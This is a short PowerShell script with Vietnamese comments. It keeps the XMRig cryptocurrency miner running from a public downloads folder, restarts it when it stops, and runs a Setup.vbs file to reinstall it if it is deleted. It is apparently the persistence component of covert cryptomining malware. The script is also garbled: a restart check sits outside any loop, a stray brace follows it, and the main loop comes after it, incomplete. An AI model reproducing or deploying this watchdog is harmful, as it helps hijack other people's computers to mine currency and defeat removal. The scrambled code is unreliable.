$coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"
$xmrigPath = "C:\Users\Public\Downloads\xmrig-6.22.2\xmrig.exe"
$setupPath = "C:\Users\Public\Downloads\Setup.vbs"

function Start-CoinRun {
  $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru
  Write-Host "coinrun.cmd START"
}

# Bắt đầu lần đầu
Start-CoinRun

  # 🔁 Kiểm tra tiến trình coinrun.cmd
  if ($global:coinRunProcess.HasExited) {
    Write-Warning "coinrun.cmd STOP. Reboot..."
    Start-CoinRun
  } else {
    Write-Host "coinrun.cmd running..."
  }

  Start-Sleep -Seconds 3
}

while ($true) {
  # 🔍 Kiểm tra xem xmrig.exe còn tồn tại không
  if (!(Test-Path $xmrigPath)) {
    Write-Warning "❌ xmrig.exe bị xóa. Đang chạy lại Setup.vbs..."

    if (Test-Path $setupPath) {
      Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
      Write-Host "🚀 Đã chạy Setup.vbs khôi phục xmrig!"
    } else {
      Write-Error "⚠️ Không tìm thấy Setup.vbs!"
    }

    break  # Thoát script sau khi xử lý
  }
